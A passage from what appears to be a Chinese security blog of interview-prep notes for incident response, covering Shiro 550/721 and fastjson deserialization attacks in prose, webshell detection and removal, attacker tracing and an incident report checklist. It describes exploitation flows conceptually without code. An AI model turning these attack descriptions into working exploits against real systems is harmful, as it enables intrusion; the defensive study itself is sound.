<p>shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。</p>
<p>shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。</p>
<hr>
<h4 id="shiro-利用链">shiro 利用链</h4>
<p>无依赖利用链，具体情况可以使用工具 ysoserial。</p>
<p>因为我们知道 Shiro 原生类中是不存在 Commons-Collection CC 依赖的时候我们就无法通过 CC 链进行攻击，我们就需要另外找一个无依赖的方式对 Shiro 的反序列化漏洞进行利用：例如通过 Shiro 自带的依赖 Commons-Beanutils 进行攻击。</p>
<hr>
<h4 id="fastjson-rce-的流程">fastjson rce 的流程</h4>
<p>简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。</p>
<hr>
<h4 id="怎样定位-webshell">怎样定位 webshell</h4>
<p>查看安全日志；查看敏感目录；查看未知端口、未知进程；使用杀毒软件，D盾，进行扫描和查杀。</p>
<hr>
<h4 id="怎样清除-webshell">怎样清除 webshell</h4>
<p>终止进程；删除相关文件。</p>
<hr>
<h4 id="杀了-webshell-还有外连流量怎样应急">杀了 webshell 还有外连流量怎样应急</h4>
<p>（1）有可能没有完全清除 webshell；</p>
<p>（2）有可能其他系统被感染了，进行流量监测找到外连流量对应的系统和设备；</p>
<p>（3）有可能攻击者在 getshell 之后植入了后门程序，查找可疑进程，同时进行流量监测。</p>
<hr>
<h4 id="攻击者清理了作案痕迹怎么办">攻击者清理了作案痕迹怎么办</h4>
<p>（1）使用 lsof 恢复被删除的文件；</p>
<p>（2）查看日志是否有新增加的用户。</p>
<hr>
<h4 id="溯源反制手段有哪些">溯源反制手段有哪些</h4>
<p>找到攻击者的真实 ip 地址，得到物理地址。</p>
<p>在威胁情报平台查询 ip 的关联事件。</p>
<p>如果是服务器 ip，通过网络空间测绘查询该 ip 的其他网段。</p>
<p>通过攻击 ip 历史 dns 解析记录/ip 反查域名，进行溯源分析。</p>
<p>提取样本特征、用户名、ID、邮箱、C2服务器等信息，对攻击者 id 进行追踪，通过社交平台获取攻击者个人信息。</p>
<hr>
<h4 id="威胁情报平台使用经验">威胁情报平台使用经验</h4>
<p>将 ip 放进去搜索即可。</p>
<p>微步：威胁分析与情报共享社区</p>
<p>安恒：安全星图平台</p>
<hr>
<h4 id="什么是攻击者画像">什么是攻击者画像</h4>
<p>攻击目的、网络代理、攻击手法；</p>
<p>虚拟身份、真实身份、联系方式、组织情况。</p>
<hr>
<h3 id="恢复">恢复</h3>
<hr>
<h4 id="怎么恢复失陷主机的文件">怎么恢复失陷主机的文件</h4>
<p>找小伙伴帮忙。</p>
<hr>
<h3 id="总结">总结</h3>
<hr>
<h4 id="攻击事件调查报告">攻击事件调查报告</h4>
<p>确定告警真实性之后要生成一个攻击事件调查报告，包含以下内容。</p>
<p>（1）攻击者最初的攻击媒介是什么？</p>
<p>（2）攻击者如何访问环境？</p>
<p>（3）攻击者是否利用漏洞获得了访问权或特权？</p>
<p>（4）攻击者如何维持权限进行指挥和控制？</p>
<p>（5）攻击在网络或设备上是否有持久性？</p>
<p>（6）持久性的方法是什么？（例如后面、shell、合法凭证、远程工具）</p>
<p>（7）哪些账号已经被盗用，分别是什么权限？</p>
<p>（8）使用什么方法进行侦察？</p>
<p>（9）是否发生横向移动，方法是什么？（例如 rdp，恶意软件，用户账号）</p>
<p>（10）数据是否被泄露，类型是什么，方法是什么？</p>
<hr>
<h4 id="写过技站法吗">写过技站法吗</h4>

                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">Last modified on 2024-04-18</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts" href="/posts/sec/python-trojan/">
			Next<br>基于 python 的无文件木马
                </a>
                
                
                
                <a class="older-posts" href="/posts/sec/char/">
			Previous<br>攻击流量特征
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                
                <p style="opacity: 0.6" align="center">
                    <small>Comments Disabled.</small>
                </p>
                
            </div>
        </div>
    </div>


                    </div>
            </div><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="https://xxxhidexxx.github.io/">
    
        <div class="nav-title">
            write-up
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories">
                分类
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags">
                标签
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	null
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    <div class="toc-wrapper">
        

        
        <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e5%87%86%e5%a4%87" class="nav-准备">
									准备
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#https-%e5%8a%a0%e5%af%86%e5%8e%9f%e7%90%86%e6%8a%93%e5%8c%85%e5%b7%a5%e5%85%b7%e6%80%8e%e4%b9%88%e6%88%aa%e8%8e%b7%e6%98%8e%e6%96%87-https-%e6%8a%a5%e6%96%87" class="nav-https-加密原理抓包工具怎么截获明文-https-报文">
									https 加密原理，抓包工具怎么截获明文 https 报文
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#java-%e5%86%85%e5%ad%98%e9%a9%ac%e7%9a%84%e5%8e%9f%e7%90%86" class="nav-java-内存马的原理">
									java 内存马的原理
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b8%b8%e8%a7%81%e5%ae%89%e5%85%a8%e8%ae%be%e5%a4%87%e7%9a%84%e7%a7%8d%e7%b1%bb%e5%92%8c%e5%8a%9f%e8%83%bd" class="nav-常见安全设备的种类和功能">
									常见安全设备的种类和功能
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6" class="nav-windows-日志文件">
									windows 日志文件
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6" class="nav-linux-日志文件">
									linux 日志文件
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90%e5%b8%b8%e7%94%a8%e5%91%bd%e4%bb%a4" class="nav-linux-日志分析常用命令">
									linux 日志分析常用命令
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e7%bb%99%e4%bd%a0%e4%b8%80%e4%b8%aa%e6%af%94%e8%be%83%e5%a4%a7%e7%9a%84%e6%97%a5%e5%bf%97%e5%ba%94%e8%af%a5%e5%a6%82%e4%bd%95%e5%88%86%e6%9e%90" class="nav-给你一个比较大的日志应该如何分析">
									给你一个比较大的日志，应该如何分析
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tcpip-%e5%9b%9b%e5%b1%82%e6%9e%b6%e6%9e%84%e5%af%b9%e5%ba%94%e7%9a%84%e5%b8%b8%e8%a7%81%e7%bd%91%e7%bb%9c%e5%8d%8f%e8%ae%ae" class="nav-tcpip-四层架构对应的常见网络协议">
									tcp/ip 四层架构对应的常见网络协议
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tcp-%e5%92%8c-udp-%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-tcp-和-udp-的区别">
									tcp 和 udp 的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#dns-%e4%bd%bf%e7%94%a8%e7%9a%84%e6%98%af-tcp-%e8%bf%98%e6%98%af-udp" class="nav-dns-使用的是-tcp-还是-udp">
									dns 使用的是 tcp 还是 udp
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%80%e4%b9%88%e6%98%af-ipv4-%e5%9c%b0%e5%9d%80%e7%9a%84-a-%e6%ae%b5-b-%e6%ae%b5-c-%e6%ae%b5%e5%ad%90%e7%bd%91%e6%8e%a9%e7%a0%81%e6%9c%89%e4%bb%80%e4%b9%88%e4%bd%9c%e7%94%a8" class="nav-什么是-ipv4-地址的-a-段-b-段-c-段子网掩码有什么作用">
									什么是 ipv4 地址的 a 段 b 段 c 段，子网掩码有什么作用
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%80%e4%b9%88%e6%98%af-webshell%e5%b8%b8%e8%a7%81%e7%9a%84-getshell-%e6%96%b9%e6%b3%95" class="nav-什么是-webshell常见的-getshell-方法">
									什么是 webshell，常见的 getshell 方法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%b8%8a%e4%bc%a0-webshell-%e4%b9%8b%e5%90%8e%e6%80%8e%e6%a0%b7%e8%8e%b7%e5%be%97%e7%bb%9d%e5%af%b9%e8%b7%af%e5%be%84" class="nav-上传-webshell-之后怎样获得绝对路径">
									上传 webshell 之后怎样获得绝对路径
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#webshell-%e4%b8%8d%e5%87%ba%e7%bd%91%e5%a6%82%e4%bd%95%e5%88%a9%e7%94%a8" class="nav-webshell-不出网如何利用">
									webshell 不出网如何利用
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%ad%a3%e5%90%91%e4%bb%a3%e7%90%86%e5%92%8c%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e7%9a%84%e5%8c%ba%e5%88%ab%e5%92%8c%e7%94%a8%e9%80%94" class="nav-正向代理和反向代理的区别和用途">
									正向代理和反向代理的区别和用途
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f%e6%98%af%e4%bb%80%e4%b9%88" class="nav-内网穿透是什么">
									内网穿透是什么
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%b8%b8%e6%88%8f%e5%8a%a0%e9%80%9f%e5%99%a8%e4%b8%8e%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f" class="nav-游戏加速器与内网穿透">
									游戏加速器与内网穿透
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e9%92%bb%e7%9f%b3%e7%a5%a8%e6%8d%ae%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-钻石票据黄金票据白银票据的区别">
									钻石票据、黄金票据、白银票据的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%ae%be%e7%bd%ae%e8%9c%9c%e7%bd%90%e7%9a%84%e6%97%b6%e5%80%99%e5%bc%80%e6%94%be%e5%93%aa%e4%ba%9b%e7%ab%af%e5%8f%a3%e7%90%86%e7%94%b1%e6%98%af%e4%bb%80%e4%b9%88" class="nav-设置蜜罐的时候开放哪些端口理由是什么">
									设置蜜罐的时候开放哪些端口，理由是什么
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%9a%b4%e5%8a%9b%e7%a0%b4%e8%a7%a3%e5%af%86%e7%a0%81%e7%9a%84%e6%97%b6%e5%80%99%e9%81%87%e5%88%b0%e7%99%bb%e5%bd%95%e5%a4%b1%e8%b4%a5%e6%ac%a1%e6%95%b0%e9%99%90%e5%88%b6%e6%80%8e%e4%b9%88%e7%bb%95%e8%bf%87" class="nav-暴力破解密码的时候遇到登录失败次数限制怎么绕过">
									暴力破解密码的时候遇到登录失败次数限制怎么绕过
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b8%b8%e8%a7%81%e7%9a%84%e5%8f%8d%e7%88%ac%e8%99%ab%e7%ad%96%e7%95%a5" class="nav-常见的反爬虫策略">
									常见的反爬虫策略
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95%e7%9a%84%e6%b5%81%e7%a8%8b" class="nav-渗透测试的流程">
									渗透测试的流程
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e7%9a%84%e6%80%9d%e8%b7%af" class="nav-信息收集的思路">
									信息收集的思路
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#redis-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%98%af%e4%bb%80%e4%b9%88%e6%80%8e%e4%b9%88%e5%88%a9%e7%94%a8%e8%83%bd%e5%81%9a%e5%88%b0-rce" class="nav-redis-未授权访问是什么怎么利用能做到-rce">
									redis 未授权访问是什么，怎么利用能做到 rce
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#ssrf-%e7%94%a8-redis-%e6%8f%90%e5%8d%87%e4%b8%ba-rce" class="nav-ssrf-用-redis-提升为-rce">
									ssrf 用 redis 提升为 rce
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e7%bb%99%e5%ae%9a%e5%9f%9f%e5%90%8d%e7%bb%95%e8%bf%87-cdn-%e6%89%be%e7%9c%9f%e5%ae%9e-ip" class="nav-给定域名绕过-cdn-找真实-ip">
									给定域名绕过 cdn 找真实 ip
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%a3%80%e6%b5%8b" class="nav-检测">
									检测
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e4%bc%a0%e7%bb%9f%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-传统漏洞攻击流量特征">
									传统漏洞攻击流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%94%bb%e5%87%bb%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-java-反序列化攻击流量特征">
									java 反序列化攻击流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b8%b8%e8%a7%81-webshell-%e7%ae%a1%e7%90%86%e5%b7%a5%e5%85%b7%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-常见-webshell-管理工具的流量特征">
									常见 webshell 管理工具的流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#cs-%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-cs-流量特征">
									cs 流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#msf-%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-msf-流量特征">
									msf 流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%85%b6%e4%bb%96%e7%ba%a2%e9%98%9f%e5%b7%a5%e5%85%b7%e7%9a%84%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-其他红队工具的流量特征">
									其他红队工具的流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%8e%e5%87%a0%e4%b8%87%e6%9d%a1%e5%91%8a%e8%ad%a6%e4%b8%ad%e5%8c%ba%e5%88%86%e6%94%bb%e5%87%bb%e5%92%8c%e8%af%af%e6%8a%a5" class="nav-从几万条告警中区分攻击和误报">
									从几万条告警中区分攻击和误报
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%88%a4%e6%96%ad%e4%ba%8b%e4%bb%b6%e7%b1%bb%e5%9e%8b" class="nav-判断事件类型">
									判断事件类型
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%88%a4%e6%96%ad%e5%a4%b1%e9%99%b7%e8%8c%83%e5%9b%b4" class="nav-判断失陷范围">
									判断失陷范围
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%8e%e5%91%8a%e8%ad%a6%e5%86%85%e7%bd%91-ip-%e7%a1%ae%e5%ae%9a%e5%9c%a8%e5%93%aa%e4%b8%80%e5%b1%82%e6%a5%bc" class="nav-从告警内网-ip-确定在哪一层楼">
									从告警内网 ip 确定在哪一层楼
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%85%e7%bd%91%e5%91%8a%e8%ad%a6%e7%9a%84%e5%a4%84%e7%90%86%e6%96%b9%e5%bc%8f" class="nav-内网告警的处理方式">
									内网告警的处理方式
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e4%b9%88%e5%88%a4%e6%96%ad%e6%9c%a8%e9%a9%ac%e6%98%af%e5%90%a6%e4%b8%8a%e4%bc%a0%e6%88%90%e5%8a%9f" class="nav-怎么判断木马是否上传成功">
									怎么判断木马是否上传成功
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e4%b9%88%e5%9c%a8%e7%99%be%e4%b8%87%e8%a1%8c%e4%bb%a3%e7%a0%81%e4%b8%ad%e6%89%be%e5%88%b0%e5%90%8e%e9%97%a8" class="nav-怎么在百万行代码中找到后门">
									怎么在百万行代码中找到后门
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%a4%a9%e7%9c%bc%e4%bd%bf%e7%94%a8%e7%bb%8f%e9%aa%8c" class="nav-天眼使用经验">
									天眼使用经验
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e5%85%a5%e4%be%b5%e6%8e%92%e6%9f%a5" class="nav-windows-入侵排查">
									windows 入侵排查
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e5%85%a5%e4%be%b5%e6%8e%92%e6%9f%a5" class="nav-linux-入侵排查">
									linux 入侵排查
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e8%b4%9f%e8%bd%bd%e5%9d%87%e8%a1%a1%e4%b9%8b%e5%90%8e%e5%a6%82%e4%bd%95%e8%8e%b7%e5%be%97%e7%9c%9f%e5%ae%9e-ip" class="nav-负载均衡之后如何获得真实-ip">
									负载均衡之后如何获得真实 ip
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%8a%91%e5%88%b6" class="nav-抑制">
									抑制
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e4%b8%ad%e5%8b%92%e7%b4%a2%e7%97%85%e6%af%92%e4%ba%86%e6%80%8e%e4%b9%88%e5%8a%9e" class="nav-中勒索病毒了怎么办">
									中勒索病毒了怎么办
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%b7%b2%e7%9f%a5%e6%94%bb%e5%87%bb%e8%80%85%e6%ad%a3%e5%9c%a8%e5%88%a9%e7%94%a8-log4j2-%e6%bc%8f%e6%b4%9e%e6%80%8e%e4%b9%88%e5%ba%94%e6%80%a5" class="nav-已知攻击者正在利用-log4j2-漏洞怎么应急">
									已知攻击者正在利用 log4j2 漏洞，怎么应急
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%8e%92%e6%9f%a5%e5%92%8c%e9%98%bb%e6%ad%a2%e5%86%85%e7%bd%91%e7%a7%bb%e5%8a%a8" class="nav-排查和阻止内网移动">
									排查和阻止内网移动
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81%e6%96%b9%e6%b3%95" class="nav-windows-权限维持方法">
									windows 权限维持方法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81%e6%96%b9%e6%b3%95" class="nav-linux-权限维持方法">
									linux 权限维持方法
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#windows-%e6%8f%90%e6%9d%83" class="nav-windows-提权">
									windows 提权
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#linux-%e6%8f%90%e6%9d%83" class="nav-linux-提权">
									linux 提权
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#sql-%e7%9a%84-udf-%e6%8f%90%e6%9d%83" class="nav-sql-的-udf-提权">
									sql 的 udf 提权
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%a0%b9%e9%99%a4" class="nav-根除">
									根除
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e6%8e%92%e6%9f%a5%e5%86%85%e5%ad%98%e9%a9%ac" class="nav-怎样排查内存马">
									怎样排查内存马
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e6%b8%85%e9%99%a4%e5%86%85%e5%ad%98%e9%a9%ac" class="nav-怎样清除内存马">
									怎样清除内存马
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%85%e5%ad%98%e9%a9%ac%e6%97%a0%e6%96%87%e4%bb%b6%e8%90%bd%e5%9c%b0%e6%80%8e%e4%b9%88%e5%8f%96%e8%af%81" class="nav-内存马无文件落地怎么取证">
									内存马无文件落地，怎么取证
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#java-web-%e4%b8%ad-servletfilterlistener-%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-java-web-中-servletfilterlistener-的区别">
									java web 中 servlet/filter/listener 的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#log4j2-%e5%8e%9f%e7%90%86%e5%92%8c%e6%b5%81%e9%87%8f%e7%89%b9%e5%be%81" class="nav-log4j2-原理和流量特征">
									log4j2 原理和流量特征
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#shiro-550-%e5%92%8c-721-%e7%9a%84%e5%8c%ba%e5%88%ab" class="nav-shiro-550-和-721-的区别">
									shiro 550 和 721 的区别
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#shiro-%e5%88%a9%e7%94%a8%e9%93%be" class="nav-shiro-利用链">
									shiro 利用链
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#fastjson-rce-%e7%9a%84%e6%b5%81%e7%a8%8b" class="nav-fastjson-rce-的流程">
									fastjson rce 的流程
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e5%ae%9a%e4%bd%8d-webshell" class="nav-怎样定位-webshell">
									怎样定位 webshell
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%80%8e%e6%a0%b7%e6%b8%85%e9%99%a4-webshell" class="nav-怎样清除-webshell">
									怎样清除 webshell
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%9d%80%e4%ba%86-webshell-%e8%bf%98%e6%9c%89%e5%a4%96%e8%bf%9e%e6%b5%81%e9%87%8f%e6%80%8e%e6%a0%b7%e5%ba%94%e6%80%a5" class="nav-杀了-webshell-还有外连流量怎样应急">
									杀了 webshell 还有外连流量怎样应急
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%94%bb%e5%87%bb%e8%80%85%e6%b8%85%e7%90%86%e4%ba%86%e4%bd%9c%e6%a1%88%e7%97%95%e8%bf%b9%e6%80%8e%e4%b9%88%e5%8a%9e" class="nav-攻击者清理了作案痕迹怎么办">
									攻击者清理了作案痕迹怎么办
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e6%ba%af%e6%ba%90%e5%8f%8d%e5%88%b6%e6%89%8b%e6%ae%b5%e6%9c%89%e5%93%aa%e4%ba%9b" class="nav-溯源反制手段有哪些">
									溯源反制手段有哪些
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5%e5%b9%b3%e5%8f%b0%e4%bd%bf%e7%94%a8%e7%bb%8f%e9%aa%8c" class="nav-威胁情报平台使用经验">
									威胁情报平台使用经验
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e4%bb%80%e4%b9%88%e6%98%af%e6%94%bb%e5%87%bb%e8%80%85%e7%94%bb%e5%83%8f" class="nav-什么是攻击者画像">
									什么是攻击者画像
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%81%a2%e5%a4%8d" class="nav-恢复">
									恢复
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%80%8e%e4%b9%88%e6%81%a2%e5%a4%8d%e5%a4%b1%e9%99%b7%e4%b8%bb%e6%9c%ba%e7%9a%84%e6%96%87%e4%bb%b6" class="nav-怎么恢复失陷主机的文件">
									怎么恢复失陷主机的文件
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
							
								</ul>
							
						
						
						
							<li>
								<a href="#%e6%80%bb%e7%bb%93" class="nav-总结">
									总结
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#%e6%94%bb%e5%87%bb%e4%ba%8b%e4%bb%b6%e8%b0%83%e6%9f%a5%e6%8a%a5%e5%91%8a" class="nav-攻击事件调查报告">
									攻击事件调查报告
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#%e5%86%99%e8%bf%87%e6%8a%80%e7%ab%99%e6%b3%95%e5%90%97" class="nav-写过技站法吗">
									写过技站法吗
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
        
    </div>
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top"
            :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div><div id="single-column-footer">
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	null
	
</div>
            </div>
    
    <script src="/js/journal.js"></script></body>
</html>
